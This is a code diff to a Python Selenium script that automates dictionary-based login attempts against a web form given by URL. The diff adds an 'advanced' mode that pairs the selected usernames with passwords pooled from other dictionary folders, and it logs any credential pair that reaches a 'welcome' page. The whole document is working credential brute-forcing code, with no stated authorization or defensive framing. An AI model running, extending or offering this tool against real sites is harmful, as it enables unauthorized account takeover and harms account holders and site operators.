@@ -38,56 +38,92 @@ def get_file_paths(selected_dir):
         "password": os.path.join(dictionary_path, "password.txt"),
     }
 
-def load_credentials(selected_dir):
-    """Load usernames and passwords from the chosen dictionary directory."""
-    file_paths = get_file_paths(selected_dir)
+def load_basic_credentials(selected_dir):
+    """Load usernames and passwords from the selected directory."""
+    paths = get_file_paths(selected_dir)
 
-    if not all(os.path.exists(path) for path in file_paths.values()):
-        logging.error("Error: One or more credential files are missing.")
+    if not os.path.exists(paths["username"]) or not os.path.exists(paths["password"]) or not os.path.exists(paths["prefix"]):
+        logging.error(f"Error: Missing username.txt, password.txt, or prefix.txt in {selected_dir}")
         return [], []
 
-    try:
-        with open(file_paths["prefix"], "r", encoding="utf-8") as pf:
-            prefix = pf.read().strip()
-        with open(file_paths["username"], "r", encoding="utf-8") as uf:
-            usernames = [prefix + line.strip() for line in uf if line.strip()]
-        with open(file_paths["password"], "r", encoding="utf-8") as pf:
-            passwords = [line.strip() for line in pf if line.strip()]
-        return usernames, passwords
-    except Exception as e:
-        logging.error(f"Error loading credentials: {e}")
+    with open(paths["prefix"], "r", encoding="utf-8") as pf:
+        prefix = pf.read().strip()
+
+    with open(paths["username"], "r", encoding="utf-8") as uf:
+        usernames = [prefix + line.strip() for line in uf if line.strip()]
+
+    with open(paths["password"], "r", encoding="utf-8") as pf:
+        passwords = [line.strip() for line in pf if line.strip()]
+
+    return usernames, passwords
+
+def load_advanced_credentials(selected_dir):
+    """Load usernames from the selected directory and passwords from all other directories."""
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    dictionary_path = os.path.join(script_dir, "Dictionary")
+
+    username_path = os.path.join(dictionary_path, selected_dir, "username.txt")
+    prefix_path = os.path.join(dictionary_path, "prefix.txt")
+
+    if not os.path.exists(username_path) or not os.path.exists(prefix_path):
+        logging.error(f"Error: Missing username.txt or prefix.txt in {selected_dir}")
         return [], []
 
-def execute_level(level):
-    """Handle user selection for execution level."""
+    with open(prefix_path, "r", encoding="utf-8") as pf:
+        prefix = pf.read().strip()
+
+    with open(username_path, "r", encoding="utf-8") as uf:
+        usernames = [prefix + line.strip() for line in uf if line.strip()]
+
+    passwords = []
+    for dir_name in os.listdir(dictionary_path):
+        dir_path = os.path.join(dictionary_path, dir_name)
+        if os.path.isdir(dir_path) and dir_name != selected_dir:
+            password_path = os.path.join(dir_path, "password.txt")
+            if os.path.exists(password_path):
+                with open(password_path, "r", encoding="utf-8") as pf:
+                    passwords.extend([line.strip() for line in pf if line.strip()])
+
+    return usernames, passwords
+
+def execute_level():
+    """Prompt user to select an execution level and directory."""
+    dir_names = get_available_directories()
+    if not dir_names:
+        logging.error("No directories found inside 'Dictionary'. Exiting.")
+        return
+
+    print("\nAvailable Dictionary Directories:")
+    for key, value in dir_names.items():
+        print(f"{key}: {value}")
+
+    choice = input("\nSelect a directory (Enter number): ").strip()
+    if choice not in dir_names:
+        logging.error("Invalid directory choice. Exiting.")
+        return
+
+    selected_dir = dir_names[choice]
+
+    print("\nSelect Execution Level:")
+    print("1: Basic Level (Usernames and Passwords from the same directory)")
+    print("2: Advanced Level (Usernames from selected directory, passwords from other directories)")
+    level = input("Enter level (1 or 2): ").strip()
+
     if level == "1":
         logging.info("Executing Basic Level...")
-
-        # Get available directories dynamically
-        dir_names = get_available_directories()
-        if not dir_names:
-            logging.error("No directories found inside 'Dictionary'. Exiting.")
-            return
-
-        # Display available directory options
-        print("\nAvailable Dictionary Directories:")
-        for key, value in dir_names.items():
-            print(f"{key}: {value}")
-
-        choice = input("\nSelect a directory (Enter number): ").strip()
-        if choice in dir_names:
-            selected_dir = dir_names[choice]
-            usernames, passwords = load_credentials(selected_dir)
-
-            if not usernames or not passwords:
-                logging.error("No usernames or passwords loaded. Exiting...")
-                return
-
-            start_webdriver(usernames, passwords)
-        else:
-            logging.error("Invalid directory choice. Exiting.")
+        usernames, passwords = load_basic_credentials(selected_dir)
+    elif level == "2":
+        logging.info("Executing Advanced Level...")
+        usernames, passwords = load_advanced_credentials(selected_dir)
     else:
         logging.error("Invalid execution level. Exiting.")
+        return
+
+    if not usernames or not passwords:
+        logging.error("No usernames or passwords loaded. Exiting...")
+        return
+
+    start_webdriver(usernames, passwords)
 
 def start_webdriver(usernames, passwords):
     """Initialize WebDriver and perform login attempts."""
@@ -106,7 +142,7 @@ def start_webdriver(usernames, passwords):
 
     try:
         with webdriver.Chrome(options=chrome_options) as driver:
-            wait = WebDriverWait(driver, 10)
+            wait = WebDriverWait(driver, 3)
             driver.get(args.login_url)
 
             for username in usernames:
@@ -135,29 +171,28 @@ def start_webdriver(usernames, passwords):
                         success_indicator = driver.find_elements(By.XPATH, "//div[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'welcome')]")
                         if success_indicator:
                             logging.info(f"✅ Success! Username: {username}, Password: {password}")
+                            driver.quit()
                             return
 
                         logging.info(f"❌ Failed: {username} / {password}")
 
                     except TimeoutException:
                         logging.error(f"⏳ Timeout waiting for elements. Retrying login for {username}/{password}...")
+                        driver.quit()
+                        return
                     except NoSuchElementException:
                         logging.error(f"⚠️ Login form not found. Skipping {username}/{password}...")
+                        driver.quit()
+                        return
                     except Exception as e:
                         logging.error(f"🚨 Unexpected error: {e}")
-
+                        driver.quit()
+                        return
+            driver.quit()
             logging.info("❌ No valid credentials found.")
 
     except Exception as e:
         logging.error(f"🚨 WebDriver error: {e}")
 
-def main():
-    """Main function to prompt user choices."""
-    print("Choose an execution level:")
-    print("1 - Basic Level")
-    
-    choice = input("Enter your choice: ").strip()
-    execute_level(choice)
-
 if __name__ == "__main__":
-    main()
+    execute_level()
